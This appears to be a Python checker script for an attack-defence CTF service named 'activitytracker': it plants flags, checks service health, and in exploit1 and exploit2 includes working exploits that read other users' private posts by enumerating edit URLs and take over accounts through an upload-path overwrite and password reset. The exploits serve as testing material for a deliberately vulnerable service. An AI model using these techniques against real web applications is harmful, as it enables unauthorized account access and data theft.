#!/usr/bin/env python3
import html

from enochecker import BaseChecker, BrokenServiceException, EnoException, run
from enochecker.utils import assert_in
import random
import string
import barnum
import os
from PIL import Image
import secrets
import re


class ActivitytrackerChecker(BaseChecker):
    """
    Change the methods given here, then simply create the class and .run() it.
    Magic.
    A few convenient methods and helpers are provided in the BaseChecker.
    ensure_bytes ans ensure_unicode to make sure strings are always equal.
    As well as methods:
    self.connect() connects to the remote server.
    self.get and self.post request from http.
    self.chain_db is a dict that stores its contents to a mongodb or filesystem.
    conn.readline_expect(): fails if it's not read correctly
    To read the whole docu and find more goodies, run python -m pydoc enochecker
    (Or read the source, Luke)
    """

    # EDIT YOUR CHECKER PARAMETERS
    flag_variants = 2
    noise_variants = 2
    havoc_variants = 2
    exploit_variants = 2
    service_name = "activitytracker"
    port = 4242  # The port will automatically be picked up as default by self.connect and self.http.
    # END CHECKER PARAMETERS

    @staticmethod
    def generate_random_image(filename):
        im = Image.open('images/profile.png')
        # im = Image.new('RGB', (30, 30))
        pixels = im.load()
        for x in range(min(30, im.size[0])):
            for y in range(min(30, im.size[1])):
                pixels[x, y] = (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
        im.save(filename, format='png')
        return filename

    def register_user(self, email: str, password: str):
        self.http_get("/auth/signup")
        filename = "/tmp/" + secrets.token_urlsafe(10) + ".png"
        self.generate_random_image(filename)
        with open(filename, 'rb') as verification_image:
            resp = self.http_post("/auth/signup",
                                  data={
                                      "email": email,
                                      "password": password
                                  },
                                  files={
                                      "image": verification_image
                                  })
        if resp.status_code != 303:
            raise EnoException(f"Unexpected status code while registering user: {resp.status_code}")

    def login_user(self, email: str, password: str):
        self.http_get("/auth/login")
        resp = self.http_post("/auth/login",
                              data={
                                  "email": email,
                                  "password": password
                              })
        if resp.status_code != 303:
            raise EnoException(f"Unexpected status code while registering user: {resp.status_code}")

    @staticmethod
    def generate_matching_emails(person1, person2, company):
        tld = barnum.create_email().split(".")[-1]
        domain = f"{company.lower().replace(' ', '')}.{tld}"
        email_patterns = [
            lambda x: f"{x[0][0]}.{x[1]}",
            lambda x: f"{x[0]}.{x[1]}",
            lambda x: f"{x[0]}{x[1]}",
            lambda x: f"{x[0][0]}{x[1]}",
            lambda x: f"{x[1]}",
            lambda x: f"{x[0]}",
            lambda x: f"{x[0]}{x[1][0]}",
        ]
        pattern = random.choice(email_patterns)
        return (
            f"{pattern(person1)}@{domain}",
            f"{pattern(person2)}@{domain}",
        )

    def putflag(self):  # type: () -> None
        """
        This method stores a flag in the service.
        In case multiple flags are provided, self.variant_id gives the appropriate index.
        The flag itself can be retrieved from self.flag.
        On error, raise an Eno Exception.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """
        if self.variant_id == 0:
            # First we need to register a user
            firstname, lastname = barnum.create_name()
            company = barnum.create_company_name()
            jobtitle = barnum.create_job_title()
            password = barnum.create_pw(length=10)

            boss_firstname, boss_lastname = barnum.create_name()
            boss_password = barnum.create_pw(length=10)

            email, boss_email = self.generate_matching_emails((firstname.lower(), lastname.lower()),
                                                              (boss_firstname.lower(), boss_lastname.lower()),
                                                              company)

            self.register_user(email, password)

            self.http_get('/posts')

            self.generate_random_posts(random.randint(0, 3), data={"firstname": firstname, "lastname": lastname, "company": company, "jobtitle": jobtitle, "password": password, "boss_firstname": boss_firstname, "boss_lastname": boss_lastname})

            self.http_get('/posts/new')
            self.http_post('/posts/insert', files={
                "body": f"I love working here at {company} as a {jobtitle}. My boss {boss_firstname} {boss_lastname} is great, and I'll get a promotion soon! Come work here as well! Cheers, {firstname} {lastname}",
                "visibility": "public"
            })

            self.generate_random_posts(random.randint(0, 3), data={"firstname": firstname, "lastname": lastname, "company": company, "jobtitle": jobtitle, "password": password, "boss_firstname": boss_firstname, "boss_lastname": boss_lastname})
            self.http_get('/posts')

            self.http_get('/auth/logout')
            self.register_user(boss_email, boss_password)
            self.http_get('/posts/new')
            self.http_post('/posts/insert', files={
                "body": self.flag,
                "visibility": "private"
            })

            # Save the generated values for the associated getflag() call.
            self.chain_db = {
                "username": boss_email,
                "password": boss_password,
            }

        elif self.variant_id == 1:
            # First we need to register a user
            firstname, lastname = barnum.create_name()
            company = barnum.create_company_name()
            jobtitle = barnum.create_job_title()
            password = barnum.create_pw(length=10)
            email = barnum.create_email(name=(firstname, lastname)).lower()

            self.register_user(email, password)

            self.http_get('/posts')

            self.generate_random_posts(random.randint(0, 3), data={"firstname": firstname, "lastname": lastname, "company": company, "jobtitle": jobtitle, "password": password}, templates='simple')

            self.http_get('/posts/new')
            self.http_post('/posts/insert', files={
                "body": f"I keep forgetting my passwords, but I discovered that they can be saved in a private post! So useful!",
                "visibility": "public"
            })

            self.http_post('/posts/insert', files={
                "body": self.flag,
                "visibility": "private"
            })

            self.generate_random_posts(random.randint(0, 3), data={"firstname": firstname, "lastname": lastname, "company": company, "jobtitle": jobtitle, "password": password}, templates='simple')
            self.http_get('/posts')

            self.http_get('/auth/logout')

            # Save the generated values for the associated getflag() call.
            self.chain_db = {
                "username": email,
                "password": password,
            }
        else:
            raise EnoException("Wrong variant_id provided")

    def getflag(self):  # type: () -> None
        """
        This method retrieves a flag from the service.
        Use self.flag to get the flag that needs to be recovered and self.round to get the round the flag was placed in.
        On error, raise an EnoException.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """
        if self.variant_id == 0 or self.variant_id == 1:
            # First we check if the previous putflag succeeded!
            try:
                username: str = self.chain_db["username"]
                password: str = self.chain_db["password"]
            except IndexError as ex:
                self.debug(f"error getting notes from db: {ex}")
                raise BrokenServiceException("Previous putflag failed.")

            self.login_user(username, password)

            # Let´s obtain our note.
            resp = self.http_get('/posts')
            assert_in(
                self.flag, html.unescape(resp.text), "Resulting flag was found to be incorrect"
            )
        else:
            raise EnoException("Wrong variant_id provided")

    def generate_random_posts(self, n=1, templates="any", data=None, private=2):
        """
        Creates n posts using the defined templates. private=0: public, 1: private, 2: random

        User should already be logged in.
        """
        posts = []
        directory = r"/checker/post_templates/"
        for filename in os.listdir(directory):
            if filename.endswith(".template"):
                f = os.path.join(directory, filename)
                if templates == "any" or templates in f:
                    with open(f) as template:
                        posts.extend(list(map(lambda x: x.strip(), template.readlines())))
            else:
                continue

        if not posts:
            raise EnoException("No matching template found.")

        for i in range(n):
            p = random.random() > 0.5
            if private == 1:
                p = False
            elif private == 0:
                p = True
            self.http_get('/posts/new')
            self.http_post('/posts/insert', files={
                "body": random.choice(posts).format(**data) if data else random.choice(posts),
                "visibility": "public" if p else "private"
            })

    def putnoise(self):  # type: () -> None
        """
        This method stores noise in the service. The noise should later be recoverable.
        The difference between noise and flag is, that noise does not have to remain secret for other teams.
        This method can be called many times per round. Check how often using self.variant_id.
        On error, raise an EnoException.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """
        if self.variant_id == 0 or self.variant_id == 1:
            # A public or private post
            firstname, lastname = barnum.create_name()
            password = barnum.create_pw(length=10)
            email = barnum.create_email(name=(firstname, lastname)).lower()
            company = barnum.create_company_name()
            jobtitle = barnum.create_job_title()
            text = barnum.create_sentence(20, 40)

            self.register_user(email, password)

            self.generate_random_posts(n=random.randint(0, 3), data={"firstname": firstname, "lastname": lastname, "company": company, "jobtitle": jobtitle, "password": password}, templates="simple")
            self.http_get('/posts')
            self.http_get('/posts/new')
            self.http_post('/posts/insert', files={
                "body": text,
                "visibility": "public" if self.variant_id == 0 else "private"
            })
            self.generate_random_posts(n=random.randint(0, 3), data={"firstname": firstname, "lastname": lastname, "company": company, "jobtitle": jobtitle, "password": password}, templates="simple")
            self.http_get('/posts')

            self.chain_db = {
                "username": email,
                "password": password,
                "text": text
            }

        else:
            raise EnoException("Wrong variant_id provided")

    def getnoise(self):  # type: () -> None
        """
        This method retrieves noise in the service.
        The noise to be retrieved is inside self.flag
        The difference between noise and flag is, that noise does not have to remain secret for other teams.
        This method can be called many times per round. Check how often using variant_id.
        On error, raise an EnoException.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """
        if self.variant_id == 0:
            # public post
            try:
                username: str = self.chain_db["username"]
                text: str = self.chain_db["text"]
            except IndexError as ex:
                self.debug(f"error getting notes from db: {ex}")
                raise BrokenServiceException("Previous putflag failed.")

            # Let´s obtain our note.
            resp = self.http_get('/posts')
            assert_in(
                text, html.unescape(resp.text), "Resulting flag was found to be incorrect"
            )
            assert_in(
                username, html.unescape(resp.text), "Resulting flag was found to be incorrect"
            )
        elif self.variant_id == 1:
            # private post
            try:
                username: str = self.chain_db["username"]
                password: str = self.chain_db["password"]
                text: str = self.chain_db["text"]
            except IndexError as ex:
                self.debug(f"error getting notes from db: {ex}")
                raise BrokenServiceException("Previous putflag failed.")

            self.login_user(username, password)

            # Let´s obtain our note.
            resp = self.http_get('/posts')
            assert_in(
                text, html.unescape(resp.text), "Resulting flag was found to be incorrect"
            )
            assert_in(
                username, html.unescape(resp.text), "Resulting flag was found to be incorrect"
            )
        else:
            raise EnoException("Wrong variant_id provided")

    def havoc(self):  # type: () -> None
        """
        This method unleashes havoc on the app -> Do whatever you must to prove the service still works. Or not.
        On error, raise an EnoException.
        :raises EnoException on Error
        :return This function can return a result if it wants
                If nothing is returned, the service status is considered okay.
                The preferred way to report Errors in the service is by raising an appropriate EnoException
        """
        if self.variant_id == 0:
            # Check edit functionality
            firstname, lastname = barnum.create_name()
            password = barnum.create_pw(length=10)
            email = barnum.create_email(name=(firstname, lastname))
            text = barnum.create_sentence(20, 40)

            self.register_user(email, password)

            self.http_get('/posts')
            self.http_get('/posts/new')
            self.http_post('/posts/insert', files={
                "body": text,
                "visibility": "public" if self.variant_id == 0 else "private"
            })
            resp = self.http_get('/posts')
            t = resp.text.split("\">Edit</a>")[0]
            url = t.split("href=\"")[-1]

            resp = self.http_get(url)
            assert_in(text, html.unescape(resp.text))
        elif self.variant_id == 1:
            # check delete functionality
            firstname, lastname = barnum.create_name()
            password = barnum.create_pw(length=10)
            email = barnum.create_email(name=(firstname, lastname))

            self.register_user(email, password)

            random_validation_text = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(64))

            self.http_get('/posts')
            self.http_get('/posts/new')
            self.http_post('/posts/insert', files={
                "body": random_validation_text,
                "visibility": "public"
            })
            resp = self.http_get('/posts')
            assert_in(random_validation_text, html.unescape(resp.text))
            t = resp.text.split("\">Delete</a>")[0]
            url = t.split("href=\"")[-1]
            self.http_get(url)
            resp = self.http_get('/posts')
            if random_validation_text in html.unescape(resp.text):
                raise BrokenServiceException(
                    "Received unexpected response.",
                    internal_message=f"{random_validation_text} is in {html.unescape(resp.text)}",
                )
        # TODO: check file upload
        else:
            raise EnoException("Wrong variant_id provided")

    def exploit(self):
        """
        This method was added for CI purposes for exploits to be tested.
        Will (hopefully) not be called during actual CTF.
        :raises EnoException on Error
        :return This function can return a result if it wants
                If nothing is returned, the service status is considered okay.
                The preferred way to report Errors in the service is by raising an appropriate EnoException
        """
        if self.variant_id == 0:
            flag = self.exploit1()
            if flag:
                return flag
            raise BrokenServiceException("Exploit does not work")
        elif self.variant_id == 1:
            flag = self.exploit2()
            if flag:
                return flag
            raise BrokenServiceException("Exploit does not work")
        else:
            raise EnoException("Wrong variant_id provided")

    pattern1 = re.compile("My boss (\\w+ \\w+) is great. .* Cheers, (\\w+ \\w+)")
    pattern2 = re.compile("by (.*@.*)")
    pattern3 = re.compile("I keep forgetting my passwords, but I discovered that "
                          "they can be saved in a private post! So useful!")

    @staticmethod
    def guess_boss_email(email, name1, name2):
        # Guesses another user's email based on the known user's email pattern (email), the new user's full name (name1), and the known user's full name (name2)
        email_patterns = [
            lambda x: f"{x[0][0]}.{x[1]}",
            lambda x: f"{x[0]}.{x[1]}",
            lambda x: f"{x[0]}{x[1]}",
            lambda x: f"{x[0][0]}{x[1]}",
            lambda x: f"{x[1]}",
            lambda x: f"{x[0]}",
            lambda x: f"{x[0]}{x[1][0]}",
        ]
        user_name = name2.lower().split(" ")
        for p in email_patterns:
            e = p(user_name)
            e += "@" + email.split("@")[-1]
            if email == e:
                return p(name1.lower().split(" ")) + "@" + email.split("@")[-1]

    def exploit1(self):
        # Create new account
        email = f"{secrets.token_urlsafe(16)}@gmail.com"
        password = secrets.token_urlsafe(16)
        self.register_user(email, password)
        resp = self.http_get(f"/posts")
        # Split post list by user
        user_posts = html.unescape(resp.text).split("Activities")
        for section in user_posts:
            # find user's email and all posts matching pattern
            try:
                email = re.findall(self.pattern2, section).pop().strip()
                posts = re.findall(self.pattern1, section)
                for post in posts:
                    # generate email to attack
                    email_to_attack = self.guess_boss_email(email, post[0], post[1])
                    n = 0
                    while True:
                        n += 1
                        # get flag by editing post based on known email
                        resp = self.http_get(f"/posts/update/{email_to_attack}/{n}")
                        if resp.status_code != 200:
                            break
                        t = html.unescape(resp.text)
                        f = self.search_flag(t)
                        if f:
                            return f
            except:
                pass

    def exploit2(self):
        # Create new account
        email = f"{secrets.token_urlsafe(16)}@gmail.com"
        password = secrets.token_urlsafe(16)
        self.register_user(email, password)
        resp = self.http_get(f"/posts")
        # Split post list by user
        user_posts = html.unescape(resp.text).split("Activities")
        for section in user_posts:
            # find user's email and all posts matching pattern
            try:
                email = re.findall(self.pattern2, section).pop().strip()
                posts = re.findall(self.pattern3, section)
                for _ in posts:
                    image_name = f"/tmp/tmp.png"
                    self.generate_random_image(image_name)
                    with open(image_name, 'rb') as image:
                        image_upload_name = f"profiles/{email}.png"
                        self.http_post('/posts/insert', data={
                            "body": "???",
                            "visibility": "public"
                        }, files={
                            "image": (image_upload_name, image)
                        })
                    self.http_get('/auth/logout')
                    with open(image_name, 'rb') as image:
                        self.http_post('/auth/forgot', data={
                            "email": email,
                            "password": "hacked1234567890"
                        }, files={
                            "image": image
                        })
                    # get flag
                    resp = self.http_get(f"/posts")
                    t = html.unescape(resp.text)
                    f = self.search_flag(t)
                    if f:
                        return f
            except:
                pass


app = ActivitytrackerChecker.service  # This can be used for uswgi.
if __name__ == "__main__":
    run(ActivitytrackerChecker)
